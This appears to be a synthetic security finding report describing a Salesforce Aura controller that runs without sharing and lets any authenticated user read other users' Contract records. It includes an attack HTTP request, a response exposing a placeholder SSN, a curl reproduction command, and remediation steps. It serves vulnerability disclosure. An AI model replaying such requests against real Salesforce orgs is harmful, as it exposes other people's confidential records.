# Security Analysis Report
**System:** SkyPort Global Distribution (Salesforce-Integrated)
**Domain:** Travel / GDS
**Example ID:** SF-0118
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass via `c.ContractController.approveContract` — `without sharing` eliminates OWD=Private enforcement on Contract records; SOQL WHERE clause has no ownership predicate |

---

## Finding 1 — Platform: SOQL and Salesforce Record-Level Access Bypass (Pattern 9.2)

### Summary
The Aura controller `c.ContractController.approveContract` on SkyPort Global Distribution (`a7fa36be.lightning.force.com`) exploits a Salesforce-specific authorization bypass: the `ContractController` Apex class runs `without sharing`, which eliminates OWD=Private enforcement at the record-level. The SOQL query has no `AND OwnerId = :UserInfo.getUserId()` predicate and no `WITH SECURITY_ENFORCED` clause. Per §5.0 Pattern 9.2, the combination of `without sharing` and a missing SOQL ownership predicate allows any authenticated user to read any Contract record in the org by supplying its ID.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getContractDetails`, but §5.0 and §6.0 HAR use `c.ContractController.approveContract`. These conflict. The HAR (§6.0) is the primary evidence — `c.ContractController.approveContract` is the authoritative affected Aura descriptor.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://a7fa36be.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://a7fa36be.lightning.force.com/aura
Authorization: Bearer 00DA7FA36BE!ARa7fa36be...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DA7FA36BE!ARa7fa36be...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.ContractController.approveContract",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "contractId": "00136BE",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "00136BE",
        "Name": "Victim Contract Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-62-8515"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-62-8515` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user. SOQL executed without sharing rules — bypassed OWD=Private.

### Steps to Reproduce
1. Authenticate to SkyPort on `a7fa36be.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `contractId`:
```bash
curl -s -X POST "https://a7fa36be.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DA7FA36BE!ARa7fa36be..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00DA7FA36BE!ARa7fa36be..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"00136BE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-62-8515) and InternalNotes__c for victim contract 00136BE
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `ContractController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
